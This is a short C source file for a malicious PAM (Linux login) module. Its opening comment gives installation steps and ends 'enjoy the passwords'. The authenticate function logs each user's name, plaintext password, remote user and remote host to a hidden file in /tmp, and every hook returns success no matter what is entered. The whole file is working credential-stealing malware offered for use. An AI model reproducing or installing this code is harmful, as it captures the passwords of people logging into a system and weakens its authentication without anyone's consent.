/*
 / Compile as a shared library, cc -shared -fPIC pam.c -o ooo.so or whatever 
 / and and place in a suitable location like /lib64/security and modify the
 / relevant pam configuration files, then sit back and enjoy the passwords...
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#define LOG_FILE "/tmp/.wpalsa"
#define UMASK 066
PAM_EXTERN 
int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, 
	const char **argv) 
{
	return PAM_SUCCESS;
}

PAM_EXTERN 
int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, 
	const char **argv)
{
	return PAM_SUCCESS;
}

PAM_EXTERN 
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, 
	const char **argv)
{
	const void *user;
	const void *auth;
	const void *rhost;
	const void *ruser;
	FILE *fd;
	
	umask(UMASK);
	
	fd = fopen(LOG_FILE, "a+");
	if (!fd)
		return PAM_SUCCESS;
	
	pam_get_item(pamh, PAM_USER, &user);
	pam_get_item(pamh, PAM_AUTHTOK, &auth);
	pam_get_item(pamh, PAM_RUSER, &ruser);
	pam_get_item(pamh, PAM_RHOST, &rhost);

	fprintf(fd, "%s %s %s (%s)\n", user, auth, ruser ? ruser : "", rhost);
	fclose(fd);

	return PAM_SUCCESS;
}


